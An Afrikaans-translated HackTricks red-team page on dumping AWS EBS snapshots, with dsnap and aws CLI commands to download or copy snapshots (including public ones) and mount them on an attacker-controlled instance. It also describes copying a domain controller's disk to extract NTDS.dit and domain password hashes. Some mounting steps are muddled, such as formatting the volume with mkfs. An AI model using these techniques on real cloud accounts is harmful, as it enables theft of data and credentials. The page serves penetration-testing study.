# AWS - EBS Snapshot Dump

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

### Checking a snapshot locally
```bash
# Install dependencies
pip install 'dsnap[cli]'
brew install vagrant
brew install virtualbox

# Get snapshot from image
mkdir snap_wordir; cd snap_workdir
dsnap init
## Download a snapshot of the volume of that instance
## If no snapshot existed it will try to create one
dsnap get <instance-id>
dsnap --profile default --region eu-west-1 get i-0d706e33814c1ef9a
## Other way to get a snapshot
dsnap list #List snapshots
dsnap get snap-0dbb0347f47e38b96 #Download snapshot directly

# Run with vagrant
IMAGE="<download_file>.img" vagrant up #Run image with vagrant+virtuabox
IMAGE="<download_file>.img" vagrant ssh #Access the VM
vagrant destroy #To destoy

# Run with docker
git clone https://github.com/RhinoSecurityLabs/dsnap.git
cd dsnap
make docker/build
IMAGE="<download_file>.img" make docker/run #With the snapshot downloaded
```
**Let daarop dat dsnap jou nie sal toelaat om openbare oomblikke te aflaai nie. Om dit te omseil, kan jy 'n kopie van die oomblik in jou persoonlike rekening maak en dit aflaai:**
```bash
# Copy the snapshot
aws ec2 copy-snapshot --source-region us-east-2 --source-snapshot-id snap-09cf5d9801f231c57 --destination-region us-east-2 --description "copy of snap-09cf5d9801f231c57"

# View the snapshot info
aws ec2 describe-snapshots --owner-ids self --region us-east-2

# Download the snapshot. The ID is the copy from your account
dsnap --region us-east-2 get snap-027da41be451109da

# Delete the snapshot after downloading
aws ec2 delete-snapshot --snapshot-id snap-027da41be451109da --region us-east-2
```
Vir meer inligting oor hierdie tegniek, kyk na die oorspronklike navorsing in [https://rhinosecuritylabs.com/aws/exploring-aws-ebs-snapshots/](https://rhinosecuritylabs.com/aws/exploring-aws-ebs-snapshots/)

Jy kan dit doen met Pacu deur die module [ebs\_\_download\_snapshots](https://github.com/RhinoSecurityLabs/pacu/wiki/Module-Details#ebs\_\_download\_snapshots)

### Kontroleer 'n oomblikopname in AWS

{% code overflow="wrap" %}
```bash
aws ec2 create-volume --availability-zone us-west-2a --region us-west-2  --snapshot-id snap-0b49342abd1bdcb89
```
**Monteer dit in 'n EC2 VM onder jou beheer** (dit moet in dieselfde streek wees as die kopie van die rugsteun):

Stap 1: 'n Nuwe volume van jou verkose grootte en tipe moet geskep word deur na EC2 ‚Äì> Volumes te gaan.

Om hierdie aksie uit te voer, volg hierdie bevele:
- Skep 'n EBS-volume om aan die EC2-instantie te heg.
- Verseker dat die EBS-volume en die instansie in dieselfde sone is.

Stap 2: Die "heg volume" opsie moet gekies word deur regs te klik op die geskepte volume.

Stap 3: Die instansie uit die instansie tekskas moet gekies word.

Om hierdie aksie uit te voer, gebruik die volgende bevel:
- Heg die EBS-volume.

Stap 4: Teken in op die EC2-instansie en lys die beskikbare skywe met behulp van die bevel `lsblk`.

Stap 5: Kontroleer of die volume enige data het deur die bevel `sudo file -s /dev/xvdf` te gebruik.

As die uitset van die bogenoemde bevel "/dev/xvdf: data" toon, beteken dit dat die volume leeg is.

Stap 6: Formateer die volume na die ext4-l√™ersisteem met die bevel `sudo mkfs -t ext4 /dev/xvdf`. Alternatiewelik kan jy ook die xfs-formaat gebruik deur die bevel `sudo mkfs -t xfs /dev/xvdf` te gebruik. Let asseblief daarop dat jy √≥f ext4 √≥f xfs moet gebruik.

Stap 7: Skep 'n gids van jou keuse om die nuwe ext4-volume te monteer. Byvoorbeeld, jy kan die naam "nuwevolume" gebruik.

Om hierdie aksie uit te voer, gebruik die bevel `sudo mkdir /nuwevolume`.

Stap 8: Monteer die volume na die "nuwevolume" gids met die bevel `sudo mount /dev/xvdf /nuwevolume/`.

Stap 9: Verander die gids na die "nuwevolume" gids en kontroleer die skyfspasie om die volume-mont te valideer.

Om hierdie aksie uit te voer, gebruik die volgende bevele:
- Verander gids na `/nuwevolume`.
- Kontroleer die skyfspasie met die bevel `df -h .`. Die uitset van hierdie bevel moet die vry spasie in die "nuwevolume" gids toon.

Jy kan dit doen met Pacu deur die module `ebs__explore_snapshots`.

### Kontroleer 'n rugsteun in AWS (met behulp van cli)

{% code overflow="wrap" %}
```bash
aws ec2 create-volume --availability-zone us-west-2a --region us-west-2 --snapshot-id <snap-0b49342abd1bdcb89>

# Attach new volume to instance
aws ec2 attach-volume --device /dev/sdh --instance-id <INSTANCE-ID> --volume-id <VOLUME-ID>

# mount the snapshot from within the VM

sudo file -s /dev/sdh
/dev/sdh: symbolic link to `xvdh'

sudo file -s /dev/xvdh
/dev/xvdh: x86 boot sector; partition 1: ID=0xee, starthead 0, startsector 1, 16777215 sectors, extended partition table (last)\011, code offset 0x63

lsblk /dev/xvdh
NAME     MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
xvdh     202:112  0    8G  0 disk
‚îú‚îÄxvdh1  202:113  0  7.9G  0 part
‚îú‚îÄxvdh14 202:126  0    4M  0 part
‚îî‚îÄxvdh15 202:127  0  106M  0 part

sudo mount /dev/xvdh1 /mnt

ls /mnt
```
{% endcode %}

### Skadukopie

Enige AWS-gebruiker wat die **`EC2:CreateSnapshot`** toestemming besit, kan die hasjies van alle domein-gebruikers steel deur 'n **skadukopie van die Domein Kontroleerder** te skep, dit aan 'n instansie wat hulle beheer te koppel en die NTDS.dit en SYSTEM-registrieringskern-l√™er uit te voer vir gebruik met Impacket se secretsdump projek.

Jy kan hierdie instrument gebruik om die aanval te outomatiseer: [https://github.com/Static-Flow/CloudCopy](https://github.com/Static-Flow/CloudCopy) of jy kan een van die vorige tegnieke gebruik nadat jy 'n skadukopie geskep het.


# Verwysings
* https://devopscube.com/mount-ebs-volume-ec2-instance/

<details>

<summary><strong>Leer AWS hak vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
